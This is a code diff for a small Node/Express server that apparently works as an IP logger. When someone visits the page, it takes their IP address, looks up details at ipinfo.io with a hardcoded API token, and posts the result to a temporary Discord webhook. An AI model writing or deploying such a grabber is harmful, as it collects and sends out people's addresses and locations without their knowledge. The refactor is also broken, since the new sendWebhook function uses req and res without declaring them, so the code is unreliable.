@@ -7,34 +7,7 @@ const botToken = process.env.bot_token;
 const channelID = process.env.channel_id;
 const port = process.env.port || 3000;
 
-async function createWebhook(channelID) {
-  const url = `https://discord.com/api/v10/channels/${channelID}/webhooks`;
-  const response = await fetch(url, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Authorization': `Bot ${botToken}`,
-    },
-    body: JSON.stringify({ name: 'Logger Webhook' }),
-  });
-  const data = await response.json();
-  return `https://discord.com/api/v10/webhooks/${data.id}/${data.token}`;
-}
-
-async function deleteWebhook(webhookUrl) {
-  const urlSplit = webhookUrl.split('/');
-  const webhookID = urlSplit[5];
-  const webhookToken = urlSplit[6];
-  const url = `https://discord.com/api/v10/webhooks/${webhookID}/${webhookToken}`;
-  await fetch(url, {
-    method: 'DELETE',
-    headers: {
-      'Authorization': `Bot ${botToken}`,
-    },
-  });
-}
-
-app.get('/', async (req, res) => {
+async function sendWebhook() {
   const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
   const data = await response.json();
@@ -47,7 +20,17 @@ app.get('/', async (req, res) => {
   const isProxy = req.headers['via'] || req.headers['x-forwarded-for'];
 
   try {
-    const webhookUrl = await createWebhook(channelID);
+    const url = `https://discord.com/api/v10/channels/${channelID}/webhooks`;
+    const webhookResponse = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bot ${botToken}`,
+      },
+      body: JSON.stringify({ name: 'Logger Webhook' }),
+    });
+    const webhookData = await webhookResponse.json();
+    const webhookUrl = `https://discord.com/api/v10/webhooks/${webhookData.id}/${webhookData.token}`;
     const webhook = new Webhook(webhookUrl);
 
     const embed = new MessageBuilder()
@@ -68,14 +51,22 @@ app.get('/', async (req, res) => {
 
     await webhook.send(embed);
 
-    webhook.on('response', async () => {
-      await deleteWebhook(webhookUrl);
-      res.send('Address Logged');
+    await fetch(webhookUrl, {
+      method: 'DELETE',
+      headers: {
+        'Authorization': `Bot ${botToken}`,
+      },
     });
+
+    res.send('Address Logged');
   } catch (error) {
     console.error(`Error handling request: ${error}`);
     res.status(500).send('Internal server error');
   }
+}
+
+app.get('/', async (req, res) => {
+  await sendWebhook(req, res);
 });
 
 app.listen(port, () => {
